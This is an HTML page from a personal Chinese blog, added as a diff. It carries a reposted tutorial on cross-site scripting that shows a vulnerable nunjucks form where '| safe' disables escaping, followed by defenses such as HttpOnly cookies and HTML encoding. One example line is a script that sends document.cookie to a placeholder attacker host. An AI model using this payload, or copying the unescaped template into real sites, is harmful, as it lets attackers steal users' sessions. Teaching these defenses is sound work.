@@ -1,0 +1,257 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>WEB攻击之_XSS「转] | 小小王的后花园</title>
+<meta name="description" content="小小王的后花园">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="http://wangqunsong.top/favicon.ico?v=1556375647041">
+<link rel="stylesheet" href="http://wangqunsong.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://wangqunsong.top">
+        <img class="avatar" src="http://wangqunsong.top/images/avatar.png?v=1556375647041" alt="" width="32px" height="32px">
+      </a>
+      <a href="http://wangqunsong.top">
+        <h1 class="site-title">小小王的后花园</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="http://wangqunsong.top" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/post/guan-yu-wo/" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">WEB攻击之_XSS「转]</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-12-03</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="http://wangqunsong.top/tag/gmqBiNDvl">
+                    安全测试
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>👏  欢迎使用 来到小小王的后花园！<br>
+✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_XSS「转]</strong></p>
+<!-- more --> 
+<p>XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
+<!--more-->
+<blockquote>
+<p><a href="https://www.daguanren.cc/post/sql-injection.html">原文链接</a></p>
+</blockquote>
+<h2 id="xss的背景与介绍">XSS的背景与介绍</h2>
+<p><strong>1.背景</strong></p>
+<p>随着互联网的发展，网站经历由单纯的只读模式到web2.0兴起的交互模式变迁，而正在向完美融合了人工智能的web3.0的道路发展。目前用户访问的大多数网站均有交互的功能，例如是电商网站的评论，微博网站的转发，论坛的发帖等等。对于正常用户而言，他们是遵守发帖和留言规范的，但对于黑客，他们是不会老老实实的按规矩办事的。</p>
+<!--more-->
+<p>下面的GIF图展示的是一个XSS攻击的示意：</p>
+<p><img src="https://i.loli.net/2019/03/14/5c8a253b7d7c7.gif" alt="alt"></p>
+<p>​
+上图先使用Chrome浏览器进行正常和非正常留言，Chrome浏览器自动检测出XSS攻击，屏蔽了请求。然后打开IE8，执行同样的操作，IE8成功受到了攻击。</p>
+<p><strong>2.XSS定义</strong></p>
+<p>​ 跨站脚本（英语：Cross-site
+scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
+XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<p>​
+简而言之，现在的网页基本是由html+css+javascript组成，普通用户输入的留言是文本信息，而黑客输入的留言内容则有可能是javascript代码。</p>
+<p><strong>3.代码解释</strong></p>
+<p>​
+以上GIF所展示的，是一个用户将文本框的信息提交form表单到后台，后台反馈到前台进行留言展示的场景。表单提交代码如下：</p>
+<pre><code>&lt;form role=&quot;form&quot; method=&quot;post&quot;&gt;
+    &lt;div class=&quot;form-group&quot;&gt;
+        &lt;label&gt;输入内容&lt;/label&gt;&lt;br /&gt;
+        &lt;textarea id=&quot;text&quot; name=&quot;text&quot;&gt;&lt;/textarea&gt;
+        &lt;/label&gt;
+    &lt;/div&gt;
+    &lt;button id=&quot;btn&quot; type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;提交&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;label&gt;展示内容&lt;/label&gt;
+&lt;div id=&quot;show&quot; class=&quot;col-md-4&quot;&gt;
+    {{text  | safe}}
+        &lt;!--这里是nunjucks模板的展示写法，由后台赋值text变量--&gt;
+&lt;/div&gt;
+
+&lt;script&gt;
+    $(&quot;#btn&quot;).click(function() {
+        $.ajax({
+            type: &quot;POST&quot;,
+            url: &quot;/index&quot;,
+            cache: false,
+            data: {&quot;text&quot;: $(&quot;#text&quot;).text()},
+            success: function(msg) {
+            }
+        });
+    })
+&lt;/script&gt;
+</code></pre>
+<p>前台表单提交到后台服务器，可以直接使用form表单提交，也可以使用ajax提交的方式。后台代码可以选择任意语言实现（java、php或者nodejs等均可），这里使用的nodejs代码，thinkjs3的框架，后台代码如下：</p>
+<pre><code>//index.js
+const Base = require('./base.js');
+
+module.exports = class extends Base {
+    indexAction() {
+        if(this.isGet) {
+                        //如果是Get请求，直接显示前台页面
+            return this.display();
+        } else if(this.isPost) {
+                        //如果是Post请求，赋值nunjucks模板中的text变量，再进行页面展示
+            let post = this.post();
+            this.assign(&quot;text&quot;, post.text);
+            return this.display();
+        }
+    }
+};
+</code></pre>
+<p>这里只是一个比较轻微的弹出警告框的攻击，但如果攻击代码是：</p>
+<pre><code>&lt;script type=text/javascript&gt;window.location = &quot;http://黑客IP:8360/getcookie?cookie=&quot;+document.cookie&lt;/script&gt;
+</code></pre>
+<p>则会将用户的cookie信息发送到黑客那里，而用户的cookie信息中很可能含有用户名和密码等重要信息，后果不堪设想。</p>
+<h2 id="当前防御-xss-的几种策略">当前防御 XSS 的几种策略</h2>
+<ol>
+<li>浏览器端主动进行XSS识别</li>
+<li>服务器端对于用户输入的内容进行过滤</li>
+<li>使用较为安全的开发框架或模板</li>
+</ol>
+<p><strong>1、浏览器端主动进行XSS识别</strong></p>
+<p>如上述Chrome浏览器会自动识别XSS攻击代码，并进行请求的屏蔽</p>
+<p><strong>2、服务器端对于用户输入的内容进行过滤</strong></p>
+<p>a)将重要的cookie标记为http only, 这样的话Javascript
+中的document.cookie语句就不能获取到cookie了；</p>
+<p>b)只允许用户输入我们希望的数据，进行数据格式校验，例如年龄就只能输入0-160的数字</p>
+<p>c)对数据进行html encode处理，过滤或移除特殊的Html标签， 例如:</p>
+<pre><code>&amp;lt; 替代 &lt;, &amp;gt; 替代 &gt;, &amp;quot 替代 &quot;
+</code></pre>
+<p>d)过滤JavaScript 事件的标签。例如 &quot;onclick=&quot;, &quot;onfocus&quot; 等等。</p>
+<p><strong>3、使用较为安全的开发框架</strong></p>
+<p>上述代码所使用的nunjucks模板中：</p>
+<pre><code>&lt;label&gt;展示内容&lt;/label&gt;
+&lt;div id=&quot;show&quot; class=&quot;col-md-4&quot;&gt;
+    {{text  | safe}}
+        &lt;!--这里是nunjucks模板的展示写法，由后台赋值text变量--&gt;
+&lt;/div&gt;
+</code></pre>
+<p>nunjucks默认所有值都会在视图内自动转义，以防止HTML注入和XSS攻击。 但是，</p>
+<pre><code> | safe
+</code></pre>
+<p>这个语句是允许应用程序在视图中注入HTML片段。所以才会被XSS攻击</p>
+<h2 id="总结">总结</h2>
+<p>XSS攻击相比于CSRF攻击，还是比较容易防范的，只要同时限制用户输入数据的格式和进行数据转义，基本可以杜绝此类攻击。</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="http://wangqunsong.top/post/web-gong-ji-zhi-_sql-zhu-ru-zhuan">
+              <h3 class="post-title">
+                下一篇：WEB攻击之_SQL注入「转]
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">小小王的后花园</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
